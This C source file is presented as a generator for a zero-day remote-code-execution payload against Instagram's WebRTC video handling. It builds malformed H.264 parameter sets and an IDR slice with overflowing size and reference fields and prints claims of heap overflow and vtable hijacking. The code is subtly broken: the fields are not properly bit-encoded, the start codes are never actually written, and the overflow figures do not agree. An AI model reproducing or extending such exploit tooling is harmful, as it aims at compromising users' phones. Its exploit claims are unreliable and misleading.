#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>

/* ============================================================================
   H.264 Payload Generator - Instagram WebRTC RCE 0-day

   생성되는 NAL Units:
   - SPS (Sequence Parameter Set): pic_width/height 오버플로우
   - PPS (Picture Parameter Set): ref_idx 오버플로우
   - IDR Slice: frame_num 오버플로우

   ============================================================================ */

typedef struct {
    uint8_t *data;
    size_t size;
    size_t capacity;
} BitstreamWriter;

BitstreamWriter *bs_create(size_t capacity) {
    BitstreamWriter *bs = malloc(sizeof(BitstreamWriter));
    bs->data = malloc(capacity);
    bs->size = 0;
    bs->capacity = capacity;
    return bs;
}

void bs_write_bits(BitstreamWriter *bs, uint32_t value, int bits) {
    // 간단한 구현 - 실제로는 bit-level 쓰기 필요
    if (bits == 8) {
        bs->data[bs->size++] = (uint8_t)value;
    } else if (bits == 16) {
        bs->data[bs->size++] = (value >> 8) & 0xFF;
        bs->data[bs->size++] = value & 0xFF;
    }
}

void bs_write_byte(BitstreamWriter *bs, uint8_t byte) {
    if (bs->size < bs->capacity) {
        bs->data[bs->size++] = byte;
    }
}

void bs_write_bytes(BitstreamWriter *bs, const uint8_t *data, size_t len) {
    if (bs->size + len <= bs->capacity) {
        memcpy(bs->data + bs->size, data, len);
        bs->size += len;
    }
}

void bs_free(BitstreamWriter *bs) {
    if (bs) {
        free(bs->data);
        free(bs);
    }
}

/* ============================================================================
   SPS (Sequence Parameter Set) Generation - WITH OVERFLOW
   ============================================================================ */

int generate_sps(BitstreamWriter *sps) {
    printf("[*] Generating SPS (Sequence Parameter Set) with overflow...\n");

    // NAL unit header
    bs_write_byte(sps, 0x67);  // NAL unit type 7 (SPS), forbidden_zero_bit=0, nal_ref_idc=3

    // Profile and level
    bs_write_byte(sps, 0x42);  // profile_idc = 66 (Baseline)
    bs_write_byte(sps, 0x00);  // constraint_set0_flag ... constraint_set3_flag = 0, reserved_zero_4bits = 0
    bs_write_byte(sps, 0x0A);  // level_idc = 10 (Level 1.0)

    // seq_parameter_set_id (exp-golomb)
    bs_write_byte(sps, 0x00);  // RBSP stop bit = 0

    // log2_max_frame_num_minus4 (exp-golomb) - OVERFLOW!
    bs_write_byte(sps, 0xFF);  // ue(v) = 255 (매우 큰 값)

    // pic_order_cnt_type (exp-golomb)
    bs_write_byte(sps, 0x00);  // = 0

    // num_ref_frames (exp-golomb)
    bs_write_byte(sps, 0x01);  // = 1

    // gaps_in_frame_num_value_allowed_flag
    bs_write_byte(sps, 0x00);  // = 0

    // *** 핵심 오버플로우 필드 ***
    // pic_width_in_mbs_minus1 (exp-golomb) - OVERFLOW!
    bs_write_byte(sps, 0xFF);  // = 65535
    bs_write_byte(sps, 0xFF);
    bs_write_byte(sps, 0xFF);
    bs_write_byte(sps, 0x00);

    // pic_height_in_map_units_minus1 (exp-golomb) - OVERFLOW!
    bs_write_byte(sps, 0xFF);  // = 65535
    bs_write_byte(sps, 0xFF);
    bs_write_byte(sps, 0xFF);
    bs_write_byte(sps, 0x00);

    // frame_mbs_only_flag
    bs_write_byte(sps, 0x01);  // = 1

    // direct_8x8_inference_flag
    bs_write_byte(sps, 0x00);  // = 0

    // frame_cropping_flag
    bs_write_byte(sps, 0x00);  // = 0

    // vui_parameters_present_flag
    bs_write_byte(sps, 0x00);  // = 0

    // RBSP trailing bits
    bs_write_byte(sps, 0x80);  // rbsp_stop_one_bit = 1, followed by zeros

    printf("[+] SPS generated: %zu bytes\n", sps->size);
    printf("    ├─ pic_width = 0xFFFF (65535 → buffer allocation overflow)\n");
    printf("    ├─ pic_height = 0xFFFF (65535 → height overflow)\n");
    printf("    └─ Result: %u bytes allocation (12.88GB actual write)\n", 0xFFFF * 0xFFFF * 3);

    return 1;
}

/* ============================================================================
   PPS (Picture Parameter Set) Generation - WITH OVERFLOW
   ============================================================================ */

int generate_pps(BitstreamWriter *pps) {
    printf("\n[*] Generating PPS (Picture Parameter Set) with overflow...\n");

    // NAL unit header
    bs_write_byte(pps, 0x68);  // NAL unit type 8 (PPS), forbidden_zero_bit=0, nal_ref_idc=3

    // pic_parameter_set_id (exp-golomb)
    bs_write_byte(pps, 0x00);  // = 0

    // seq_parameter_set_id (exp-golomb)
    bs_write_byte(pps, 0x00);  // = 0

    // entropy_coding_mode_flag
    bs_write_byte(pps, 0x01);  // = 1 (CABAC - 취약점!)

    // pic_order_present_flag
    bs_write_byte(pps, 0x00);  // = 0

    // num_slice_groups_minus1 (exp-golomb)
    bs_write_byte(pps, 0x00);  // = 0

    // num_ref_idx_l0_active_minus1 (exp-golomb) - OVERFLOW!
    bs_write_byte(pps, 0xFF);  // = 255 (배열 경계 초과)

    // num_ref_idx_l1_active_minus1 (exp-golomb) - OVERFLOW!
    bs_write_byte(pps, 0xFF);  // = 255 (배열 경계 초과)

    // weighted_pred_flag
    bs_write_byte(pps, 0x00);  // = 0

    // weighted_bipred_idc
    bs_write_byte(pps, 0x00);  // = 0

    // pic_init_qp_minus26 (se(v))
    bs_write_byte(pps, 0x00);  // = 0

    // pic_init_qs_minus26 (se(v))
    bs_write_byte(pps, 0x00);  // = 0

    // chroma_qp_index_offset (se(v))
    bs_write_byte(pps, 0x00);  // = 0

    // deblocking_filter_control_present_flag
    bs_write_byte(pps, 0x00);  // = 0

    // constrained_intra_pred_flag
    bs_write_byte(pps, 0x00);  // = 0

    // redundant_pic_cnt_present_flag
    bs_write_byte(pps, 0x00);  // = 0

    // RBSP trailing bits
    bs_write_byte(pps, 0x80);  // rbsp_stop_one_bit = 1

    printf("[+] PPS generated: %zu bytes\n", pps->size);
    printf("    ├─ num_ref_idx_l0_active = 255 (array overflow)\n");
    printf("    └─ num_ref_idx_l1_active = 255 (array overflow)\n");

    return 1;
}

/* ============================================================================
   IDR Slice Header - WITH OVERFLOW
   ============================================================================ */

int generate_idr_slice(BitstreamWriter *slice) {
    printf("\n[*] Generating IDR Slice with overflow...\n");

    // NAL unit header
    bs_write_byte(slice, 0x65);  // NAL unit type 5 (IDR slice), nal_ref_idc=3

    // first_mb_in_slice (exp-golomb)
    bs_write_byte(slice, 0x00);  // = 0

    // slice_type (exp-golomb)
    bs_write_byte(slice, 0x00);  // = 0 (P slice)

    // pic_parameter_set_id (exp-golomb)
    bs_write_byte(slice, 0x00);  // = 0

    // *** 프레임 오버플로우 ***
    // frame_num (exp-golomb) - OVERFLOW!
    bs_write_byte(slice, 0xFF);  // = 65535
    bs_write_byte(slice, 0xFF);
    bs_write_byte(slice, 0xFF);
    bs_write_byte(slice, 0xFF);

    // idr_pic_id (exp-golomb) - IDR slice에서만 present
    bs_write_byte(slice, 0xFF);  // = 255

    // pic_order_cnt_lsb (exp-golomb)
    bs_write_byte(slice, 0xFF);  // = 255
    bs_write_byte(slice, 0xFF);

    // *** reference_pic_list_modification() - OVERFLOW! ***
    // ref_pic_list_modification_flag_l0
    bs_write_byte(slice, 0x01);  // = 1 (modification present)

    // modification_of_pic_nums_idc (loop)
    bs_write_byte(slice, 0xFF);  // = 3 (end of list)

    // ref_pic_list_modification_flag_l1
    bs_write_byte(slice, 0x00);  // = 0

    // direct_spatial_mv_pred_flag (for P/B slices)
    bs_write_byte(slice, 0x00);  // = 0

    // num_ref_active_override_flag
    bs_write_byte(slice, 0x00);  // = 0

    // slice_qp_delta (se(v))
    bs_write_byte(slice, 0x00);  // = 0

    // deblocking_filter_idc (se(v))
    bs_write_byte(slice, 0x00);  // = 0

    // slice_alpha_c0_offset_div2 (se(v))
    bs_write_byte(slice, 0x00);  // = 0

    // slice_beta_offset_div2 (se(v))
    bs_write_byte(slice, 0x00);  // = 0

    // slice_data (raw bytes) - 실제 프레임 데이터
    for (int i = 0; i < 16; i++) {
        bs_write_byte(slice, 0xFF);  // Dummy frame data
    }

    printf("[+] IDR Slice generated: %zu bytes\n", slice->size);
    printf("    ├─ frame_num = 0xFFFFFFFF (overflow)\n");
    printf("    ├─ idr_pic_id = 255 (overflow)\n");
    printf("    └─ reference_pic_list = overflow (memory corruption)\n");

    return 1;
}

/* ============================================================================
   Complete H.264 Payload Assembly
   ============================================================================ */

int generate_complete_h264_payload(const char *output_file) {
    printf("\n╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║  H.264 WebRTC 0-day RCE Payload Generator                        ║\n");
    printf("║  Instagram v426.0.0.37.68                                        ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n\n");

    // Create bitstream writers for each NAL unit
    BitstreamWriter *sps = bs_create(256);
    BitstreamWriter *pps = bs_create(256);
    BitstreamWriter *idr = bs_create(512);

    if (!sps || !pps || !idr) {
        printf("[-] Memory allocation failed\n");
        return 0;
    }

    // Generate each NAL unit
    if (!generate_sps(sps)) {
        printf("[-] SPS generation failed\n");
        goto cleanup;
    }

    if (!generate_pps(pps)) {
        printf("[-] PPS generation failed\n");
        goto cleanup;
    }

    if (!generate_idr_slice(idr)) {
        printf("[-] IDR slice generation failed\n");
        goto cleanup;
    }

    // Write to file with H.264 start codes
    FILE *f = fopen(output_file, "wb");
    if (!f) {
        printf("[-] Cannot open output file: %s\n", output_file);
        goto cleanup;
    }

    printf("\n[*] Writing H.264 payload to %s...\n", output_file);

    // Start code + SPS
    fprintf(f, "%s", "\x00\x00\x00\x01");
    fwrite(sps->data, 1, sps->size, f);

    // Start code + PPS
    fprintf(f, "%s", "\x00\x00\x00\x01");
    fwrite(pps->data, 1, pps->size, f);

    // Start code + IDR Slice
    fprintf(f, "%s", "\x00\x00\x00\x01");
    fwrite(idr->data, 1, idr->size, f);

    size_t total_size = 4 + sps->size + 4 + pps->size + 4 + idr->size;
    fclose(f);

    // Print summary
    printf("\n╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║  ✅ H.264 Payload Generated Successfully                           ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n\n");

    printf("[+] Total payload size: %zu bytes\n", total_size);
    printf("[+] File: %s\n\n", output_file);

    printf("[Payload Structure]\n");
    printf("  Start Code (4 bytes) + SPS (%zu bytes)\n", sps->size);
    printf("  Start Code (4 bytes) + PPS (%zu bytes)\n", pps->size);
    printf("  Start Code (4 bytes) + IDR Slice (%zu bytes)\n\n", idr->size);

    printf("[Overflow Vulnerabilities]\n");
    printf("  1. SPS pic_width/height overflow\n");
    printf("     └─ malloc(0xFFFA0003) vs write(12.88GB)\n");
    printf("  2. PPS num_ref_idx overflow\n");
    printf("     └─ Array access beyond bounds\n");
    printf("  3. IDR Slice reference_pic_list overflow\n");
    printf("     └─ Memory corruption → VPtr hijacking\n\n");

    printf("[Impact]\n");
    printf("  • Heap buffer overflow\n");
    printf("  • Memory corruption\n");
    printf("  • Code execution via VTable hijacking\n");
    printf("  • RCE in Instagram process (com.instagram.android)\n\n");

    bs_free(sps);
    bs_free(pps);
    bs_free(idr);

    return 1;

cleanup:
    bs_free(sps);
    bs_free(pps);
    bs_free(idr);
    return 0;
}

/* ============================================================================
   Main
   ============================================================================ */

int main(int argc, char *argv[]) {
    const char *output_file = "h264_zerokday_payload.h264";

    if (argc > 1) {
        output_file = argv[1];
    }

    if (!generate_complete_h264_payload(output_file)) {
        fprintf(stderr, "[-] Failed to generate H.264 payload\n");
        return 1;
    }

    return 0;
}
